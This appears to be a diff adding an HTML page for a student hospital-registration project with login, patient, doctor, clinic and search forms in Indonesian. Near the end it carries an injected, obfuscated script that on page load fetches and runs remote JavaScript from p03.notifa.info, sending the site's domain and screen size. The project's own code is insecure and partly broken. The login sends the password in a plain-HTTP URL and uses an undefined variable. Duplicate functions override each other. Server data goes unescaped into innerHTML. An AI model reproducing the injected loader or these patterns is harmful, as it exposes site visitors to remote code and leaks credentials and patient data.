@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+
+<html>
+    <title>HELLO KITTY</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+
+    <style>
+        .button {
+            background-color: pink;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+        }
+    </style>
+
+    <body>
+        <!-- Navbar (sit on top) -->
+        <div class="w3-top">
+            <div class="w3-bar w3-white w3-wide w3-padding w3-card">
+                <a href="http://it-projects.usd.ac.id/~165314018" class="w3-bar-item w3-button"><b>RS</b> Hello Kitty</a>
+                <!-- Float links to the right. Hide them on small screens -->
+                <div class="w3-right w3-hide-small">
+                    <a href="#login" class="w3-bar-item w3-button">Login</a>
+                    <a href="#about" class="w3-bar-item w3-button">About</a>
+                    <a href="#pasien" class="w3-bar-item w3-button">Pasien</a>
+                    <a href="#dokter" class="w3-bar-item w3-button">Dokter</a>
+                    <a href="#klinik" class="w3-bar-item w3-button">Klinik</a>
+                    <a href="#cariPasien" class="w3-bar-item w3-button">Cari Pasien</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Header -->
+        <header class="w3-display-container w3-content w3-wide" style="max-width:1500px;" id="home">
+            <img class="w3-image" src="rs1.jpg" alt="Architecture" width="1500" height="800">
+            <div class="w3-display-middle w3-margin-top w3-center">
+                <h1 class="w3-xxlarge w3-text-white"><span class="w3-padding w3-black w3-opacity-min"><b>RS</b></span> <span class="w3-hide-small w3-text-light-grey">Hello Kitty</span></h1>
+            </div>
+        </header>
+
+        <!-- Page content -->
+        <div class="w3-content w3-padding" style="max-width:1564px">
+
+            <!-- Login -->
+            <div class="w3-container w3-padding-32" id="login">
+                <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16">Login</h3>
+            </div>
+            <form action="#" method="POST" id="form1">
+                Username
+                <input id="username" name="username" class="text" type="text"/ placeholder="Isi Disini..">
+
+                       Password
+                       <input id="password" name="password" class="text" type="password"/ placeholder="Isi Disini">
+                       <input type="submit" onclick="loadDoc()" value="Login" />
+
+            </form>
+            <script>
+                function loadDoc() {
+                    var email = username.value;
+                    var password = password.value;
+                    var url = 'http://202.94.83.190:8080/165314021RS2/webresources/User/login1?email=' + email + '&password=' + pw;
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function () {
+                        if (this.readyState == 4 && this.status == 200) {
+                            var user = JSON.parse(this.responseText);
+                            if (user !== null) {
+                                window.open("index.html", "_self");
+                            } else {
+                                alert("Login Gagal");
+                            }
+
+                            document.getElementById("demo").innerHTML =
+                                    this.responseText;
+                        }
+                    };
+                    xhttp.open("GET", url, true);
+                    xhttp.send();
+                }
+            </script>
+            <!-- About -->
+            <div class="w3-container w3-padding-32" id="about">
+                <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16">About</h3>
+                <p>Somewhere over the rainbow
+                    Way up high
+                    And the dreams that you dream of
+                    Once in a lullaby
+                    Somewhere over the rainbow
+                    Bluebirds fly
+                    And the dreams that you dream of
+                    Dreams really do come true
+                    Someday, I wish upon a star
+                    Wake up where the clouds are far behind me
+                    Where trouble melts like lemon drops
+                    High above the chimney top
+                    That's where you'll find me
+                    Somewhere over the rainbow
+                    Bluebirds fly
+                    And the dreams that you dare to
+                    Oh why, oh why can't I?
+                    Well, I see trees of green and red roses too
+                    I'll watch them bloom for me and you
+                    And I think to myself
+                    What a wonderful world
+                    Well, I see skies of blue and I see clouds of white
+                    And the brightness of day
+                    I like the dark
+                    And I think to myself what a wonderful world
+                    The colors of the rainbow so pretty in the sky
+                    And also on the faces of people passing by
+                    I see friends shaking hands saying
+                    How do you do?
+                    They're really saying I, I love you
+                    I hear babies cry and I watch them grow
+                    They'll learn much more then we'll know
+                    And I think to myself what a wonderful world
+                    World
+                    Someday I wish upon a star
+                    Wake up where the clouds are far behind me
+                    Where trouble melts like lemon drops
+                    High above the chimney top
+                    That's where you'll find me
+                    Oh, somewhere over the rainbow
+                    Way up high
+                    And the dreams that you dare to
+                    Why oh, why can't I?
+                </p>
+                <p>MERRY CHRISTMAS</p>
+                <p>LOKASI</p>
+                <a href="http://it-projects.usd.ac.id/~165314018/maps" class="button">Klik Disini</a>
+            </div>
+
+            <!-- Pasien -->
+            <div class="w3-container w3-padding-32" id="pasien">
+                <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16">Pendaftaran Pasien</h3>
+            </div>
+            <form onsubmit="return make_json(this);" method="POST">
+                NIK
+                <input style="width: 100%" type="text" name="nik" value=""/>
+                <br/>
+                <br/>
+                Nama
+                <input style="width: 100%" type="text" name="nama" value=""/>
+                <br/>
+                <br/>
+                Alamat
+                <input style="width: 100%" type="text" name="alamat" value=""/>
+                <br/>
+                <br/>
+                Tanggal Lahir
+                <input style="width: 100%" type="date" name="tanggallahir" value=""/>
+                <br/>
+                <br/>
+                Kelamin
+                <input style="width: 100%" type="text" name="kelamin" value=""/>
+                <br/>
+                <br/>
+                <input type="submit" value="Tambah"/>
+            </form>
+            <pre id="output">
+            </pre>
+            <h1>List Antrian</h1>
+
+            <div id="outtable">
+                <button type="button" onclick="loadDocAntrian()" id="myselect">Cari</button>
+                <div id="scrolltable"> 
+                    <p id="demo"></p>
+                    <script>
+                        function loadDocAntrian() {
+
+                            var xmlhttp = new XMLHttpRequest();
+                            var url = "http://202.94.83.190:8080/165314021RS3/webresources/Antrian";
+
+                            xmlhttp.onreadystatechange = function () {
+                                if (this.readyState == 4 && this.status == 200) {
+                                    myFunction(this.responseText);
+                                }
+                            }
+                            xmlhttp.open("GET", url, true);
+                            xmlhttp.send();
+
+                            function myFunction(response) {
+                                var arr = JSON.parse(response);
+                                var i;
+                                var out = "<table border='1'> <tr><td>Id Antrian</td><td>NoRM</td><td>Nama Pasien</td><td>Tanggal Periksa</td><td>Nama Klinik</td><td>Alamat</td></tr>";
+
+                                for (i = 0; i < arr.length; i++) {
+                                    out += "<tr><td>" +
+                                            arr[i].id +
+                                            "</td><td>" +
+                                            arr[i].noRm +
+                                            "</td><td>" + arr[i].nama + "</td><td>" + arr[i].tanggal + "</td><td>" + arr[i].namaKlinik + "</td><td>" + arr[i].alamat + "</tr>";
+                                }
+                                out += "</table>";
+                                document.getElementById("demo").innerHTML = out;
+                            }
+                        }
+
+                    </script>
+                    <script>
+                        function make_json(form) {
+                            var json = {
+                                "noRM": form.nik.value,
+                                "nama": form.nama.value,
+                                "alamat": form.alamat.value,
+                                "nik": form.nik.value,
+                                "tanggalLahir": form.tanggallahir.value,
+                                "kelamin": form.kelamin.value
+
+                            };
+                            var html = JSON.stringify(json, 0, 100);
+                            var Url = "http://202.94.83.190:8080/rsku/webresources/pasien/tambahPasienBaru";
+                            var xhr = new XMLHttpRequest();
+                            xhr.open('POST', Url, false);
+                            xhr.setRequestHeader("Content-type", "application/json");
+                            xhr.send(html);
+                            document.getElementById("output").innerHTML = html;
+                            return false;
+                        }
+
+
+                    </script>
+                    <!-- Dokter -->
+                    <div class="w3-container w3-padding-32" id="dokter">
+                        <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16">Dokter</h3>
+
+                        <br></br>
+                        <form onsubmit="return make_json(this);" style="border:1px solid #ccc" method="POST">
+                            <table>
+                                <tr><td>Nama</td> <td>:</td> <td><input type="text" name="nama" value=""/></td></tr>
+                                <tr><td>Spesialis</td> <td>:</td> <td><input type="text" name="spesialis" value=""/></td></tr>
+                            </table>
+                            <br></br>
+                            <input type="submit" value="Tambah"/>
+                        </form>
+
+                        <pre id="berhasil">
+                        </pre></div>
+                    
+
+                    <script>
+                        function make_json(form) {
+                            var json = {
+                                "nama": form.nama.value,
+                                "spesialis": form.spesialis.value
+                            };
+                            var html = JSON.stringify(json, 0, 100);
+
+                            var Url = "http://202.94.83.190:8080/165314021RS3/webresources/Dokter/addDokter";
+                            var xhr = new XMLHttpRequest();
+                            xhr.open('POST', Url, false);
+                            xhr.setRequestHeader("Content-type", "application/json");
+                            xhr.send(html);
+                            document.getElementById("berhasil").innerHTML = "Pendaftaran Berhasil";
+                            return false;
+                        }
+
+                    </script>
+                    
+                      <h1>Dokter Spesialis</h1>
+                    <a href="http://it-projects.usd.ac.id/~165314018/dokter" class="button">Klik Disini</a>
+                    <!-- Klinik -->
+                    <div class="w3-container w3-padding-32" id="klinik">
+                        <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16">Tambah Klinik</h3>
+                    </div>
+                    <form onsubmit="return make_json(this);" method="POST">
+                        Id Klinik <input style="width: 100%" type="text" name="idKlinik" value=""/>
+                        <br/>
+                        <br/>
+                        Nama Klinik <input style="width: 100%" type="text" name="nama" value=""/>
+                        <br/>
+                        <br/>
+                        <input type="submit" value="Tambah"/>
+                    </form>
+                    <pre id="output">
+                    </pre>
+                    <h1>Klinik Spesialis</h1>
+                    <a href="http://it-projects.usd.ac.id/~165314018/klinik" class="button">Klik Disini</a>
+
+                    <script>
+                        function make_json(form) {
+                            var json = {
+                                "idKlinik": form.idKlinik.value,
+                                "nama": form.nama.value
+
+                            };
+                            var html = JSON.stringify(json, 0, 100);
+                            var Url = "http://202.94.83.190:8080/rsku/webresources/klinik/tambahKlinik";
+                            var xhr = new XMLHttpRequest();
+                            xhr.open('POST', Url, false);
+                            xhr.setRequestHeader("Content-type", "application/json");
+                            xhr.send(html);
+                            document.getElementById("output").innerHTML = html;
+                            return false;
+                        }
+
+                    </script>
+                    <!-- Cari -->
+                    <div class="w3-container w3-padding-32" id="cariPasien">
+                        <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16">Cari Pasien</h3>
+                    </div>
+                    <div class="contact-form">
+                        <table>
+                            <tr><td>No Rekam Medis</td> <td>:</td> <td><input type="text" id="nrm"/> <button type="button" onclick="loadDoc()" id="btn">Cari</button></td></tr>
+                        </table>
+
+                        <br/><br/><br/><h2><strong>Hasil Pencarian</strong></h2><br/>
+                        <table>
+                            <tr><td>Nama</td> <td>:</td> <td><input type="text" id="nama" value=""/></td></tr>
+                            <tr><td>NIK</td> <td>:</td> <td><input type="text" id="nik" value=""/></td></tr>
+                            <tr><td>Alamat</td> <td>:</td> <td><input type="text" id="alamat" value=""/></td></tr>
+                            <tr><td>Tanggal Lahir</td> <td>:</td> <td><input type="text" id="tanggalLahir" value=""/></td></tr>
+                            <tr><td>Kelamin</td> <td>:</td><td><input type="text" id="kelamin" value=""/></td></tr>
+
+                        </table><script>
+                            function loadDoc() {
+
+                                var url = "http://202.94.83.190:8080/165314021RS3/webresources/pasien/cariPasien?noRm=" + nrm.value;
+                                var xhttp = new XMLHttpRequest();
+                                xhttp.open("GET", url, true);
+                                xhttp.send();
+                                xhttp.onreadystatechange = function () {
+                                    if (this.readyState == 4 && this.status == 200) {
+                                        var objj = JSON.parse(this.responseText);
+                                        document.getElementById("nama").value = objj.nama;
+                                        document.getElementById("nik").value = objj.nik;
+                                        document.getElementById("alamat").value = objj.alamat;
+                                        document.getElementById("tanggalLahir").value = objj.tanggalLahir;
+                                        document.getElementById("kelamin").value = objj.kelamin;
+                                    }
+                                };
+                            }</script>
+                        <!-- End page content -->
+                    </div>
+                    <script type="text/javascript">if (self == top) {
+                            function netbro_cache_analytics(fn, callback) {
+                                setTimeout(function () {
+                                    fn();
+                                    callback();
+                                }, 0);
+                            }
+                            function sync(fn) {
+                                fn();
+                            }
+                            function requestCfs() {
+                                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd%2bzckUW8YGta5zUzj33PDbktEp27EjOVWuvtX4mpeZ%2b1WZm3AncR1bu3JqWfj14pfyyfjN6mhohAE7px6t0nNiThtT3iZS64L6ozzbC2JI7RHYxbIhzPjSqNYu7IGzNFqtqUscKuZJ%2bPR71sTIppWKQ8VOzmAIQbKo5RVclFCShhH%2fIbcGyldmj3bYpoB%2b7ls5%2fYTg1YhKfctWgrbguOKfFhk0iUzxl681hhHPP5C7IM8hiNpCF4ABTJAtwRWcZoTmUJ7BU1yQ0Uo%2b7aOFS7y2tedADS%2bJ9PSVPDhtuXOfTh1fV7Othj4vMkIu0Yid0aDRvvUGiCPU8MpRCUFGp6i0glk5p0KV7A8H0Sook4%2bE2LETanwCwizmaapg83x%2bElVDf6uJxCPltSkIhFbAzmsGGBp4rwCOOOq1%2fORnQMYheEu9NmpHIsYnQ%2fHWBwHMfPreP%2bC4vL1wQcOUUSYER1wIacNdnhhbWwjlSB%2bBYtSnDGsBZHJSFuhOcLvK%2fkjg9TMFuz52sbAciHcHrQSEUFj6uOk1kuqWWPbEF2yhSOqdo%2bmm7glTf%2fhbCNYTVdxUGGx" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                                var bsa = document.createElement('script');
+                                bsa.type = 'text/javascript';
+                                bsa.async = true;
+                                bsa.src = url;
+                                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+                            }
+                            netbro_cache_analytics(requestCfs, function () {});
+                        }
+                        ;
+                    </script>
+
+                    <!-- Footer -->
+                    <footer class="w3-center w3-black w3-padding-16">
+                        <p>Powered by <a href="https://www.instagram.com/justinbieber/?hl=id" title="W3.CSS" target="_blank" class="w3-hover-text-green">Gesang Ageng Trisakti</a></p>
+                    </footer>
+                    </body>
+                    </html>
